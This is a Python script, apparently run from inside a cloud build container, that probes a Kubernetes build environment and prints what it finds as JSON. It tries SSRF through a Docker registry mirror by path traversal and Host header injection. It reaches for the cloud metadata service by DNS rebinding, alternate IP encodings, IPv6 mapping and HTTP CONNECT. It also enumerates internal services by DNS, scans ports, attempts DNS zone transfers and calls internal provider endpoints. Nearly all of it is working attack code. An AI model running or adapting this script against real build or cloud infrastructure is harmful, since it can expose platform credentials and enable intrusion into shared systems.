import json, os, socket, struct, time
import urllib.request, urllib.error, ssl

r = {}
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MIRROR = 'http://docker-cache.docker-cache.svc.cluster.local:5000'

# ============================================================
# 1. DOCKER MIRROR SSRF TESTS
# ============================================================
r['mirror_ssrf'] = {}

# 1a. Path traversal in image name — can we make the mirror request
# an internal URL by injecting path components?
traversal_tests = [
    # Try to make mirror request an internal host via path traversal
    f'{MIRROR}/v2/..%2F..%2F..%2F/manifests/latest',
    f'{MIRROR}/v2/library%2F..%2F..%2Fv2%2F_catalog/manifests/latest',
    # Try to hit the mirror's own API via self-reference
    f'{MIRROR}/v2/_catalog',
    # Try double-encoding
    f'{MIRROR}/v2/..%252F..%252F/manifests/latest',
    # Registry API probing
    f'{MIRROR}/v2/',
    f'{MIRROR}/debug/pprof/',
    f'{MIRROR}/debug/vars',
    f'{MIRROR}/metrics',
]

for url in traversal_tests:
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        body = resp.read(2000).decode(errors='replace')
        r['mirror_ssrf'][url.replace(MIRROR, '')] = {
            'status': resp.status,
            'body': body[:500],
            'headers': dict(resp.headers)
        }
    except urllib.error.HTTPError as e:
        r['mirror_ssrf'][url.replace(MIRROR, '')] = {
            'status': e.code,
            'body': e.read(500).decode(errors='replace')[:300]
        }
    except Exception as e:
        r['mirror_ssrf'][url.replace(MIRROR, '')] = str(e)[:100]

# 1b. Host header injection — can we make the mirror connect to a different backend?
host_injection_tests = [
    ('169.254.169.254', '/latest/meta-data/'),
    ('10.245.0.1', '/version'),
    ('kubernetes.default.svc.cluster.local', '/version'),
    ('127.0.0.1:8080', '/'),
]
r['mirror_host_inject'] = {}
for host, path in host_injection_tests:
    try:
        req = urllib.request.Request(f'{MIRROR}/v2/library/alpine/manifests/latest',
            headers={'Host': host})
        resp = urllib.request.urlopen(req, timeout=5)
        r['mirror_host_inject'][host] = {
            'status': resp.status,
            'body': resp.read(500).decode(errors='replace')[:300]
        }
    except Exception as e:
        r['mirror_host_inject'][host] = str(e)[:100]

# 1c. Check if mirror follows redirects — if we reference an image whose
# manifest redirects to an internal URL, does the mirror follow it?
# We test by checking mirror response headers for redirect behavior
r['mirror_meta'] = {}
try:
    req = urllib.request.Request(f'{MIRROR}/v2/', method='GET')
    resp = urllib.request.urlopen(req, timeout=5)
    r['mirror_meta']['api_root'] = {
        'status': resp.status,
        'headers': dict(resp.headers)
    }
except Exception as e:
    r['mirror_meta']['api_root'] = str(e)[:200]

# ============================================================
# 2. DNS REBINDING TEST
# ============================================================
# If filtering is at DNS level (unlikely given our errno=11 results),
# a domain resolving to an internal IP would bypass it.
# We use known public DNS rebinding services
r['dns_rebind'] = {}

# Test: resolve a domain that points to 169.254.169.254
# Using common rebinding test domains
rebind_domains = [
    # nip.io / sslip.io style domains that resolve to arbitrary IPs
    '169.254.169.254.nip.io',
    '169-254-169-254.sslip.io',
    '10.245.0.1.nip.io',
    '10-245-0-1.sslip.io',
    # localhost via public DNS
    'localhost.localdomain',
    'localtest.me',  # resolves to 127.0.0.1
]

for domain in rebind_domains:
    try:
        ips = socket.getaddrinfo(domain, None, socket.AF_INET)
        resolved_ip = ips[0][4][0]
        r['dns_rebind'][domain] = {'resolved': resolved_ip}

        # If it resolves to an internal IP, try to connect
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            ret = s.connect_ex((resolved_ip, 80))
            r['dns_rebind'][domain]['tcp_80'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
            s.close()
        except Exception as e:
            r['dns_rebind'][domain]['tcp_80'] = str(e)[:60]

        # Also try connecting via the domain name (in case filtering is IP-based
        # but the connect happens before the IP check)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            ret = s.connect_ex((domain, 80))
            r['dns_rebind'][domain]['tcp_domain'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
            s.close()
        except Exception as e:
            r['dns_rebind'][domain]['tcp_domain'] = str(e)[:60]

        # HTTP test via the domain
        try:
            resp = urllib.request.urlopen(f'http://{domain}/latest/meta-data/', timeout=3)
            r['dns_rebind'][domain]['http'] = resp.read(500).decode(errors='replace')[:300]
        except Exception as e:
            r['dns_rebind'][domain]['http'] = str(e)[:100]

    except Exception as e:
        r['dns_rebind'][domain] = str(e)[:100]

# ============================================================
# 3. DNS ENUMERATION — discover build infrastructure
# ============================================================
r['dns_enum'] = {}

# 3a. Service discovery via SRV records
srv_queries = [
    '_http._tcp.docker-cache.docker-cache.svc.cluster.local',
    '_https._tcp.kubernetes.default.svc.cluster.local',
]
import subprocess
for q in srv_queries:
    try:
        out = subprocess.check_output(['python3', '-c', f'''
import dns.resolver
try:
    ans = dns.resolver.resolve("{q}", "SRV")
    print([str(r) for r in ans])
except: print("no-dnspython")
'''], timeout=3, stderr=subprocess.STDOUT).decode().strip()
        r['dns_enum'][q] = out
    except:
        r['dns_enum'][q] = 'skip'

# 3b. Enumerate namespaces and services via DNS
namespace_guesses = [
    'build', 'build-system', 'builder', 'builds',
    'apps', 'app-platform', 'appplatform',
    'docker-cache', 'registry', 'docr',
    'monitoring', 'logging', 'observability',
    'ingress', 'nginx', 'traefik',
    'kube-system', 'default',
    'cert-manager', 'istio-system',
    'cilium', 'calico-system',
]
r['dns_namespaces'] = {}
for ns in namespace_guesses:
    # Try to find any service in this namespace
    for svc in ['api', 'web', 'server', 'proxy', 'cache', 'registry', 'nginx', 'default']:
        fqdn = f'{svc}.{ns}.svc.cluster.local'
        try:
            ip = socket.getaddrinfo(fqdn, None, socket.AF_INET)[0][4][0]
            r['dns_namespaces'][fqdn] = ip
        except:
            pass

# 3c. Try to discover build-specific services
build_services = [
    'docker-cache.docker-cache.svc.cluster.local',
    'registry.docker-cache.svc.cluster.local',
    'buildkit.build-system.svc.cluster.local',
    'kaniko.build-system.svc.cluster.local',
    'builder.build-system.svc.cluster.local',
    'cache.build-system.svc.cluster.local',
    'api.build-system.svc.cluster.local',
    'webhook.build-system.svc.cluster.local',
]
r['dns_build_svc'] = {}
for svc in build_services:
    try:
        ip = socket.getaddrinfo(svc, None, socket.AF_INET)[0][4][0]
        r['dns_build_svc'][svc] = ip
        # Try connecting
        for port in [80, 443, 8080, 5000, 9090]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                ret = s.connect_ex((ip, port))
                if ret == 0:
                    r['dns_build_svc'][f'{svc}:{port}'] = 'CONNECTED'
                s.close()
            except:
                pass
    except:
        pass

# ============================================================
# 4. REDIRECT-BASED SSRF
# ============================================================
# Test if HTTP clients in the build follow redirects to internal IPs
r['redirect_ssrf'] = {}

# 4a. Check what happens when we try to HTTP GET an internal IP
# via urllib (which follows redirects by default)
internal_http_targets = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/metadata/v1/',
    'http://10.245.0.1:443/',
    'http://10.245.0.10:9153/metrics',
    # Docker mirror internal endpoints
    f'{MIRROR}/v2/_catalog',
]
for url in internal_http_targets:
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        r['redirect_ssrf'][url] = {
            'status': resp.status,
            'body': resp.read(500).decode(errors='replace')[:300]
        }
    except Exception as e:
        r['redirect_ssrf'][url] = str(e)[:100]

# ============================================================
# 5. UDP SERVICE ACCESS
# ============================================================
r['udp'] = {}

# Test UDP access to kube-dns and other services
udp_targets = [
    ('10.245.0.10', 53, 'kube-dns'),
    ('169.254.169.254', 80, 'imds-udp'),
    ('10.245.0.1', 443, 'k8s-api-udp'),
]

for host, port, label in udp_targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        # Send a DNS query for kube-dns, garbage for others
        if port == 53:
            # DNS query for kubernetes.default
            query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0akubernetes\x07default\x03svc\x07cluster\x05local\x00\x00\x01\x00\x01'
            s.sendto(query, (host, port))
            data, addr = s.recvfrom(1024)
            r['udp'][label] = f'response_len={len(data)}'
        else:
            s.sendto(b'GET / HTTP/1.0\r\n\r\n', (host, port))
            try:
                data, addr = s.recvfrom(1024)
                r['udp'][label] = f'response_len={len(data)}'
            except socket.timeout:
                r['udp'][label] = 'send_ok_recv_timeout'
        s.close()
    except Exception as e:
        r['udp'][label] = str(e)[:60]

# ============================================================
# 6. DO INTERNAL API ENDPOINTS
# ============================================================
r['do_internal'] = {}

# Check if any DO internal endpoints are reachable
do_endpoints = [
    'https://api.digitalocean.com/v2/account',
    'https://cloud.digitalocean.com/v1/oauth/token',
    'https://api-internal.digitalocean.com/',
    'https://svc.digitalocean.com/',
    'https://internal.digitalocean.com/',
]
for url in do_endpoints:
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'probe/1.0'})
        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
        r['do_internal'][url] = {
            'status': resp.status,
            'body': resp.read(500).decode(errors='replace')[:300]
        }
    except urllib.error.HTTPError as e:
        r['do_internal'][url] = {
            'status': e.code,
            'body': e.read(500).decode(errors='replace')[:200]
        }
    except Exception as e:
        r['do_internal'][url] = str(e)[:100]

# ============================================================
# 7. METADATA SERVICE VIA DIFFERENT PROTOCOLS
# ============================================================
r['imds_alt'] = {}

# 7a. Try IMDS via IPv6
try:
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.settimeout(2)
    # IPv6-mapped IPv4 for 169.254.169.254
    ret = s.connect_ex(('::ffff:169.254.169.254', 80))
    r['imds_alt']['ipv6_mapped'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
    s.close()
except Exception as e:
    r['imds_alt']['ipv6_mapped'] = str(e)[:60]

# 7b. Try IMDS via different IP representations
alt_imds = [
    ('2852039166', 'decimal'),  # 169.254.169.254 as decimal
    ('0xa9fea9fe', 'hex'),      # hex
    ('0251.0376.0251.0376', 'octal'),  # octal
]
for ip_repr, label in alt_imds:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        # Python's connect doesn't accept these, but urllib might
        resp = urllib.request.urlopen(f'http://{ip_repr}/latest/meta-data/', timeout=3)
        r['imds_alt'][label] = resp.read(200).decode(errors='replace')[:100]
    except Exception as e:
        r['imds_alt'][label] = str(e)[:80]

# 7c. Try IMDS via HTTP CONNECT through the mirror
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    mirror_ip = socket.getaddrinfo('docker-cache.docker-cache.svc.cluster.local', 5000)[0][4][0]
    s.connect((mirror_ip, 5000))
    s.send(b'CONNECT 169.254.169.254:80 HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n')
    resp = s.recv(1024)
    r['imds_alt']['http_connect_via_mirror'] = resp.decode(errors='replace')[:200]
    s.close()
except Exception as e:
    r['imds_alt']['http_connect_via_mirror'] = str(e)[:80]

# ============================================================
# 8. K8S DNS ZONE TRANSFER ATTEMPT
# ============================================================
r['dns_axfr'] = {}
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(('10.245.0.10', 53))
    # AXFR query for cluster.local
    query = b'\x00\x1c'  # length prefix for TCP DNS
    query += b'\x12\x34\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    query += b'\x07cluster\x05local\x00'
    query += b'\x00\xfc\x00\x01'  # AXFR, IN class
    s.send(query)
    resp = s.recv(4096)
    r['dns_axfr']['cluster.local'] = resp.hex()[:200] if resp else 'empty'
    s.close()
except Exception as e:
    r['dns_axfr']['cluster.local'] = str(e)[:80]

# Also try for svc.cluster.local
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(('10.245.0.10', 53))
    query = b'\x00\x20'
    query += b'\x12\x35\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    query += b'\x03svc\x07cluster\x05local\x00'
    query += b'\x00\xfc\x00\x01'
    s.send(query)
    resp = s.recv(4096)
    r['dns_axfr']['svc.cluster.local'] = resp.hex()[:200] if resp else 'empty'
    s.close()
except Exception as e:
    r['dns_axfr']['svc.cluster.local'] = str(e)[:80]

print(json.dumps(r, indent=2, default=str))
